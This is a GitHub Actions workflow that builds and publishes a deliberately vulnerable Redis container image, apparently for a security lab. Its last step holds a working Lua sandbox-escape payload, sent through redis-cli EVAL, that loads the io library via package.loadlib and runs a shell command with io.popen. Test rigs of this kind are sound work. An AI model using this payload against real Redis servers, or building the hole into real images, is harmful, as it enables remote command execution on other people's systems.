name: CI - Redis vulnerable image

on:
  push:
    branches:
      - main
      - feature/tuning
    paths:
      - 'example/Dockerfile.redis-vulnerable'
      - '.github/workflows/ci-redis-image.yaml'
  workflow_dispatch:

permissions:
  contents: read
  packages: write

jobs:
  build:
    name: Build & push redis-vulnerable
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Log in to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build and push
        uses: docker/build-push-action@v6
        with:
          context: example
          file: example/Dockerfile.redis-vulnerable
          platforms: linux/amd64,linux/arm64
          push: true
          tags: |
            ghcr.io/k8sstormcenter/redis-vulnerable:7.2.10
            ghcr.io/k8sstormcenter/redis-vulnerable:latest

      - name: Verify sandbox escape (amd64)
        run: |
          docker run -d --name redis-test ghcr.io/k8sstormcenter/redis-vulnerable:7.2.10
          sleep 3
          # Test 1: package module is accessible
          docker exec redis-test redis-cli EVAL "return tostring(package)" 0
          # Test 2: package.loadlib function exists
          docker exec redis-test redis-cli EVAL "return tostring(package.loadlib)" 0
          # Test 3: Full sandbox escape via loadlib
          docker exec redis-test redis-cli EVAL "
            local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if not io_l then return 'loadlib_failed' end
            local io = io_l()
            local f = io.popen('id')
            local res = f:read('*a')
            f:close()
            return res
          " 0
          docker rm -f redis-test
